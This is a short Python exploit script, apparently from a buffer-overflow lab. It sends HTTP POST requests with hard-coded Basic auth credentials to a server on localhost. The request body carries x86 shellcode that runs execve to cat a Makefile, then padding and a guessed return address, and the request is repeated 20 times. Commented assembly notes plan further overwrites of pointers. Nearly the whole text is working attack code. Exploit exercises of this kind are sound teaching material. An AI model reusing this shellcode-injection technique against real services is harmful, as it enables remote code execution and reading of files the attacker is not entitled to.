# import requests
# import base64


url = "http://localhost:8000/"

# payl = "test" + ":" + "029794db6e76cb559613732d7c94b24b360bb6f05879bb99e7765518b55abc57"
# headers = {"Authorization":"Basic " + base64.b64encode(payl.encode("utf-8")).decode("utf-8"),'Content-Length': '2'}
# payload = {'test': 'value1', 'key2': 'value2'}



# response = requests.post(url,headers = headers,data="h2")

# print(response.status_code)
# print(response.headers)
# print(response.text)

from requests import Request, Session
import base64
import time


pas="test:029794db6e76cb559613732d7c94b24b360bb6f05879bb99e7765518b55abc57"


for i in range(20):
	s = Session()
	mystr = 70*"!"
	addr = "\x20\xce\x70\xff"
	req = Request('POST', url, data="\xEB\x29\x5E\x31\xC0\x88\x46\x08\x88\x46\x11\x89\x76\x12\x89\xF2\x83\xC2\x09\x89\x56\x16\x89\x46\x1A\xB0\x0B\x89\xF3\x8D\x4E\x12\x31\xD2\xCD\x80\x31\xC0\x40\x31\xDB\xCD\x80\xE8\xD2\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x63\x61\x74\x58\x4D\x61\x6B\x65\x66\x69\x6C\x65\x01" + mystr +addr)

	prepped = req.prepare()
	prepped.headers['Content-Length'] = '66' 
	prepped.headers['Authorization'] = "Basic " + base64.b64encode(pas.encode("utf-8")).decode("utf-8")
	response = s.send(prepped)


	print(response.status_code)
	print(response.headers)
	print(response.content)
	time.sleep(1)



	#FFC5B138


	#TODO: overwrite char*c with an address containing '\0' so that the loop terminates immedately                   
	# section .data
    #	null_char db 0
	# mov eax, null_char
	# mov [c], eax

	#	   overwrite char*name with FFFFFFF
	# mov eax, 0xFFFFFFFF
    # mov [name], eax
	
	#	   guess the buffer address